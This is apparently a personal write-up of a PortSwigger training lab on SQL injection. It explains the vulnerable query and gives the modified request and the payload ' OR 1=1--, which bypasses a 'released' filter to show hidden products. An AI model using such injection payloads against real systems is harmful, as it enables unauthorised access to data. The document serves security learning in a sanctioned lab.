# SQL Injection – Retrieve Hidden Data (PortSwigger)

**Category:** SQL Injection  
**Difficulty:** Apprentice  
**Lab:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 🧠 Objective
Exploit a SQL injection vulnerability in the product category filter to retrieve products that are marked as *unreleased* in the database.

## 📝 Vulnerability Summary
The application uses a SQL query similar to:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1;

The `category` parameter is not properly sanitized, allowing an attacker to inject additional conditions.

## 🎯 Exploitation
I intercepted the category filter request in Burp Suite and modified the `category` parameter to inject a boolean-based SQL condition. This allowed me to bypass the `released = 1` filter and retrieve products that are normally hidden.

### 🔹 Modified HTTP request:
GET /filter?category=Lifestyle ' OR 1=1-- HTTP/2

This injection closes the original string, adds a condition that always evaluates to true, and comments out the rest of the query.

## 🔹 Payload used
' OR 1=1--

A simple boolean-based payload that forces the WHERE clause to always return true.

## 🔹 Resulting SQL logic (conceptual)
SELECT * FROM products 
WHERE category = 'Lifestyle' OR 1=1--' 
AND released = 1;

Because `1=1` is always true, the `released = 1` condition is bypassed, causing the application to return all products, including unreleased ones.

## ✅ Result
The application displayed hidden/unreleased products, solving the lab.
